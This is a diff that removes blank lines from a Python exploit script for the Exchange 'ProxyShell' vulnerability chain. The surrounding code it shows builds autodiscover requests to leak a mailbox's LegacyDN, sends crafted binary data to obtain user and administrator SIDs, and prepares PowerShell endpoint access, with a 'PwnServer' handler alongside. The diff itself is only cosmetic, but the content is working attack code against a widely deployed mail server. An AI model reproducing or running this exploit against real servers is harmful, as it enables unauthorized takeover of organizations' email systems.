@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 import argparse
 import base64
 import struct
@@ -58,9 +57,7 @@ class PwnServer(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
             return
 class ProxyShell:
-
     def __init__(self, exchange_url, email, verify=False):
-
         self.email = email
         self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
         self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
@@ -69,7 +66,6 @@ class ProxyShell:
         self.rand_subj = rand_string(16)
         self.session = requests.Session()
         self.session.verify = verify
-
     def post(self, endpoint, data, headers={}):
         path = ''
         if 'powershell' in endpoint:
@@ -96,7 +92,6 @@ class ProxyShell:
             print("bad powershell_token "+ str(t) + " but let try...")
             return self.token
     def get_sid(self):
-
         data = self.legacydn
         data += '\x00\x00\x00\x00\x00\xe4\x04'
         data += '\x00\x00\x09\x04\x00\x00\x09'
@@ -123,7 +118,6 @@ class ProxyShell:
         else:
             self.admin_sid = self.sid
     def get_legacydn(self):
-
         data = self.autodiscover_body()
         headers = {'Content-Type': 'text/xml'}
         r = self.post(
@@ -136,16 +130,13 @@ class ProxyShell:
         self.legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', autodiscover_xml)[0]
 
     def autodiscover_body(self):
-
         autodiscover = ET.Element(
             'Autodiscover',
             xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
         )
-
         request = ET.SubElement(autodiscover, 'Request')
         ET.SubElement(request, 'EMailAddress').text = self.email
         ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
-
         return ET.tostring(
             autodiscover,
             encoding='unicode',
